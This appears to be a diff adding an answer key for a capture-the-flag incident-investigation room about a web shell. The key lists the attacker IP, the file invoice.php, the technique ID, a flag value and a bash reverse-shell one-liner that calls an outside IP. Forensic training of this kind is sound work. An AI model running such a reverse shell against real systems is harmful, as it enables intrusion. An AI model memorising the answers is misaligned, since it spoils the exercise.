@@ -1,0 +1,13 @@
+1. 1. 34.67.91.83
+   2. 18, 35
+   3. python-requests/2.31.0
+   4. invoice.php
+   5. 2025-11-06 14:27:34
+   6. whoami
+   7. T1505.003
+   8. /usr/sbin/php-fpm7.4
+   9. bash -i >& /dev/tcp/115.58.148.86/8080 0>&1
+   10. www-data
+   11.  /etc/trycrm/config.json
+   12. portaldrop2025.xyz
+   13. THM{p0rtal_dropp3d?}
